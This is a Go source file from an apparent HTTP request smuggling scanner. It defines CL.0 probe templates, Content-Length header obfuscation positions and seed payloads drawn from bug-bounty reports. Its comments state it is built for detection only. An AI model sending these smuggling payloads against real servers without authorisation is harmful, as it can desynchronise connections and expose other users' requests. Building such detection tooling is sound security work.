package technique

import "fmt"

// CLObfuscation is the family nine paid findings are members of. See the package doc.
//
// THE SMUGGLED BODY IS A PREFIX, NOT A REQUEST. The template's body is an INCOMPLETE request
// (`GET /<random>-kontra HTTP/1.1` with a dangling header and no terminating CRLFCRLF). If the
// front-end forwards it and the back-end does not consume it, it sits in the socket and prefixes
// whatever lands next — which the pipelined oracle sees as step 3 answering 400 or 404 instead
// of 200. That is CL.0 detection.
//
// It deliberately does NOT complete a smuggled request and does NOT name a collaborator host.
// Every reported PoC in the corpus finishes the job (`GET / HTTP/1.1\r\nHost: ...oastify.com`)
// because a report has to prove impact. A scanner sweeping 37k hosts does not, and FOLDSCAN's
// Safety section is the standing rule: detection probes only, exploitation manual and
// per-target.
var CLObfuscation = Family{
	ID:         "cl-obfuscation",
	Class:      "CL.0",
	Axis:       AxisSmuggle,
	HeaderName: "Content-Length",
	Template: "POST ${endpoint}?cb=${random} HTTP/1.1\r\n" +
		"Host: ${host}\r\n" +
		"${header_block}" +
		"Content-Type: application/x-www-form-urlencoded\r\n" +
		"Connection: keep-alive\r\n" +
		"{HEADER}\r\n" +
		"\r\n" +
		"GET /${random}-kontra HTTP/1.1\r\n" +
		"X: X",
	Positions: []Position{
		// `\tContent-Length: 101`  — #2357178, #2358526
		{"before-name", func(n, h, v string) string { return h + n + ": " + v }},
		{"in-name", func(n, h, v string) string { return splitName(n, h) + ": " + v }},
		// `Content-Length : 31`   — smuggler.py's "space1", and the left half of #<redacted>
		{"after-name", func(n, h, v string) string { return n + h + ": " + v }},
		// `Content-Length\t:\t31` — #<redacted>
		{"around-colon", func(n, h, v string) string { return n + h + ":" + h + v }},
		// `Content-Length: +31`   — #2444112, #2456548, #2509057, #2509198, #2413017
		{"before-value", func(n, h, v string) string { return n + ": " + h + v }},
		{"after-value", func(n, h, v string) string { return n + ": " + v + h }},
		// `Content-Length \r\n : 31` — #2356849. An obs-fold (RFC 7230 §3.2.4, obsolete): a
		// parser that still honours line folding joins the two lines and reads a valid header;
		// one that does not sees a nameless line and a continuation it cannot attach. Both
		// readings are defensible, which is exactly what makes it a desync.
		{"obs-fold", func(n, h, v string) string { return n + h + "\r\n : " + v }},
	},
	// The domain is every byte that is not a letter, digit or the two characters that make a
	// well-formed header line. Control bytes are where the disagreements live (smuggler.py's
	// exhaustive config sweeps 0x01-0x1F and 0x7F-0xFF for the same reason), and the printable
	// oddities are in the corpus: `+` alone is five reports across four programs.
	Domain:  hostileBytes(),
	Casings: []Casing{CasePreserve, CaseLower, CaseUpper},
	Seeds: []Seed{
		{"h1:2357178", "\tContent-Length: 101", "101"},
		{"h1:2358526", "\tContent-Length: 35", "35"},
		{"h1:2431300", "Content-Length\t:\t31", "31"},
		{"h1:2356849", "Content-Length \r\n : 31", "31"},
		{"h1:2444112", "Content-Length: +31", "31"},
		{"h1:2456548", "Content-Length: +31", "31"},
		{"h1:2509057", "Content-Length: +30", "30"},
		{"h1:2509198", "Content-Length: +30", "30"},
		{"h1:2413017", "content-length: +29", "29"},
	},
	Explanation: func(pos, hole string) string {
		return fmt.Sprintf(
			"byte %s at %s of the Content-Length header line. If the front-end's parser rejects "+
				"or skips the malformed line while the back-end's accepts it, the front-end "+
				"forwards a body it does not know is there, and that body prefixes the next "+
				"request on the connection.", quoteByte(hole), pos)
	},
}

// Families is the registry the offline extraction walks.
var Families = []Family{CLObfuscation}

// hostileBytes is the fill domain: 0x01-0x20, 0x7F-0xFF, and the printable characters that turn
// up in real findings or in smuggler.py's corpus. 0x00 is excluded because a NUL in a Go string
// reaching a socket is far more likely to be truncated by something in our own path than to be
// forwarded, which would make every result about us rather than about the target.
func hostileBytes() []string {
	var out []string
	for b := 0x01; b <= 0x20; b++ {
		out = append(out, string(rune(b)))
	}
	for b := 0x7F; b <= 0xFF; b++ {
		out = append(out, string([]byte{byte(b)}))
	}
	for _, s := range []string{"+", "-", ".", ",", ";", "\"", "'", "(", ")", "*", "/", "\\"} {
		out = append(out, s)
	}
	return out
}

func splitName(n, h string) string {
	if len(n) < 8 {
		return n
	}
	return n[:8] + h + n[8:] // Content-|Length
}

func quoteByte(h string) string {
	if len(h) == 1 && h[0] >= 0x21 && h[0] <= 0x7E {
		return "'" + h + "'"
	}
	return fmt.Sprintf("%#02x", h[0])
}
